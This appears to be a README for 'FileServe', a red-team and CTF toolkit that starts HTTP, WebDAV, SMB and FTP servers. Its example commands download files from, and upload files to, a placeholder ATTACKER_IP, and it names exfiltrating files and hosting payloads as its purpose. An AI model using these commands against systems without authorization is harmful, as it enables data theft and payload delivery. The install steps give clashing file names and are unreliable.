# FileServe

**FileServe** is a lightweight **file transfer toolkit for red teamers, penetration testers, and CTF players**.

It allows you to quickly spin up multiple file transfer services such as:

* HTTP download server
* WebDAV upload server
* SMB share
* FTP server
* Simple upload server

The goal is to provide **one command to quickly transfer files during engagements**.

---

# Features

* Quick file hosting
* Multiple transfer methods
* Optional authentication
* Automatic dependency installation
* Auto IP detection
* Built for **CTF / Red Team operations**
* Simple command interface

---

# Supported Transfer Modes

| Mode         | Description                         |
| ------------ | ----------------------------------- |
| `--nginx`    | WebDAV server for upload & download |
| `--smb`      | Impacket SMB share                  |
| `--download` | Python HTTP file server             |
| `--upload`   | Python upload server                |
| `--ftp`      | Python FTP server                   |

---

# Installation

Clone the repository:

```bash
git clone https://github.com/4m3rr0r/FileServe.git
cd FileServe
chmod +x FileServe
sudo mv fileserve /usr/local/bin/
```

Run:

```bash
./fileserve.sh --help
```

The script will automatically install required dependencies.

---

# Usage

```
FileServe - File Transfer Toolkit

Usage:
FileServe [MODE] [OPTIONS]
```

### Modes

```
-n, --nginx      Nginx WebDAV (Upload + Download)
-s, --smb        SMB Share
-d, --download   Python HTTP Download Server
-u, --upload     Python Upload Server
-f, --ftp        Python FTP Server
```

### Options

```
--ssl            Enable HTTPS for Nginx mode
-p, --port       Custom port
-U, --user       Username
-P, --pass       Password
-h, --help       Show help menu
```

---

# Examples

## Start HTTP Download Server

```bash
./fileserve.sh -d 
```

Client:

```bash
wget http://ATTACKER_IP:8000/file.txt
```

---

# SMB Share

```bash
./fileserve.sh --smb
```

Windows:

```
copy \\ATTACKER_IP\share\file.exe C:\Temp\file.exe
```

Mount share:

```
net use D: \\ATTACKER_IP\share
```

---

# WebDAV Upload Server

```bash
./fileserve.sh --nginx
```

Upload from Linux:

```bash
curl -T file.txt http://ATTACKER_IP:9001/upload/file.txt
```

---

# Upload Server

```bash
./fileserve.sh --upload
```

Upload file:

```bash
curl -X POST http://ATTACKER_IP:8080/upload -F 'files=@file.txt'
```

---

# FTP Server

```bash
./fileserve.sh --ftp
```

Upload:

```bash
curl -T file.txt ftp://ATTACKER_IP:2121/
```

---

# Authentication

You can enable authentication with:

```bash
./fileserve.sh --ftp -U user -P pass
```

---

# Why FileServe?

During CTFs and red team engagements you often need to:

* transfer tools
* exfiltrate files
* host payloads
* bypass restrictions

FileServe provides **multiple transfer options in one toolkit**.

---

# Dependencies

Automatically installed if missing:

* nginx
* python3
* python3-pip
* impacket
* pyftpdlib
* uploadserver
